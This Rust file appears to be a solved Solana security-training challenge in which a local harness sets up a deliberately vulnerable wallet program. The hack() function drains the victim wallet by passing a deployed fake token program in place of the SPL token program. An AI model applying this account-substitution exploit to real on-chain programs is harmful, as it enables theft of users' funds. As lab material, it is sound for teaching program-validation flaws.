use std::{env, str::FromStr};

use owo_colors::OwoColorize;
use poc_framework::solana_sdk::signature::Keypair;
use poc_framework::spl_associated_token_account::get_associated_token_address;
use poc_framework::{
    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
};

use pocs::assert_tx_success;
use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
// need to pull these in
use borsh::BorshSerialize;
use solana_program::instruction::{AccountMeta, Instruction};

struct Challenge {
    hacker: Keypair,
    wallet_program: Pubkey,
    wallet_address: Pubkey,
    wallet_owner: Pubkey,
    mint: Pubkey,
}

// Do your hacks in this function here
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    assert_tx_success(env.execute_as_transaction(
        &[level4::initialize(
            challenge.wallet_program,
            challenge.hacker.pubkey(),
            challenge.mint,
        )],
        &[&challenge.hacker],
    ));

    let hacker_wallet_address = level4::get_wallet_address(
        &challenge.hacker.pubkey(),
        &challenge.wallet_program,
    )
    .0;
    let authority_address = level4::get_authority(&challenge.wallet_program).0;
    let fake_token_program =
        env.deploy_program("target/deploy/level4_poc_contract.so");

    env.execute_as_transaction(
        &[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet_address, false),             // usually: wallet_address
                AccountMeta::new_readonly(authority_address, false),        // usually: authority_address
                AccountMeta::new_readonly(challenge.hacker.pubkey(), true), // usually: owner_address
                AccountMeta::new(challenge.wallet_address, false),          // usually: destination
                AccountMeta::new_readonly(spl_token::ID, false),            // usually: expected mint
                AccountMeta::new_readonly(fake_token_program, false),       // usually: spl_token program address
            ],
            data: level4::WalletInstruction::Withdraw { amount: 1337 }
                .try_to_vec()
                .unwrap(),
        }],
        &[&challenge.hacker],
    )
    .print_named("hax");
}


/*
SETUP CODE BELOW
*/
pub fn main() {
    let (mut env, challenge, internal) = setup();
    hack(&mut env, &challenge);
    verify(&mut env, challenge, internal);
}

struct Internal {
    wallet_owner: Keypair,
    wallet_amount: u64,
}

fn verify(env: &mut LocalEnvironment, challenge: Challenge, internal: Internal) {
    let tx = env.execute_as_transaction(
        &[level4::withdraw(
            challenge.wallet_program,
            challenge.wallet_owner,
            challenge.wallet_address,
            challenge.mint,
            internal.wallet_amount,
        )],
        &[&internal.wallet_owner],
    );

    tx.print_named("Verification: owner withdraw");

    if tx.transaction.meta.unwrap().err.is_none() {
        println!("[*] {}", "Exploit not successful.".red());
    } else {
        println!("[*] {}", "Congratulations, the exploit succeeded!".green());
    }
}

fn setup() -> (LocalEnvironment, Challenge, Internal) {
    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("level4.so");
        dir.to_str()
    }
    .unwrap();

    let wallet_program = Pubkey::from_str("W4113t3333333333333333333333333333333333333").unwrap();
    let wallet_owner = keypair(0);
    let rich_boi = keypair(1);
    let mint = keypair(2).pubkey();
    let rich_boi_ata = get_associated_token_address(&rich_boi.pubkey(), &mint);
    let hacker = keypair(42);

    let a_lot_of_money = sol_to_lamports(1_000_000.0);

    let mut env = LocalEnvironment::builder()
        .add_program(wallet_program, path)
        .add_account_with_lamports(
            wallet_owner.pubkey(),
            system_program::ID,
            sol_to_lamports(100.0),
        )
        .add_account_with_lamports(rich_boi.pubkey(), system_program::ID, a_lot_of_money * 2)
        .add_account_with_lamports(hacker.pubkey(), system_program::ID, sol_to_lamports(1.0))
        .add_token_mint(mint, None, a_lot_of_money, 9, None)
        .add_associated_account_with_tokens(rich_boi.pubkey(), mint, a_lot_of_money)
        .build();

    let wallet_address = level4::get_wallet_address(&wallet_owner.pubkey(), &wallet_program).0;

    // Create Wallet
    assert_tx_success(env.execute_as_transaction(
        &[level4::initialize(
            wallet_program,
            wallet_owner.pubkey(),
            mint,
        )],
        &[&wallet_owner],
    ));

    println!("[*] Wallet created!");

    // rich boi pays for bill
    assert_tx_success(env.execute_as_transaction(
        &[level4::deposit(
            wallet_program,
            wallet_owner.pubkey(),
            rich_boi_ata,
            rich_boi.pubkey(),
            mint,
            a_lot_of_money,
        )],
        &[&rich_boi],
    ));
    println!("[*] rich boi payed his bills");

    (
        env,
        Challenge {
            wallet_address,
            hacker,
            wallet_program,
            wallet_owner: wallet_owner.pubkey(),
            mint,
        },
        Internal {
            wallet_owner,
            wallet_amount: a_lot_of_money,
        },
    )
}
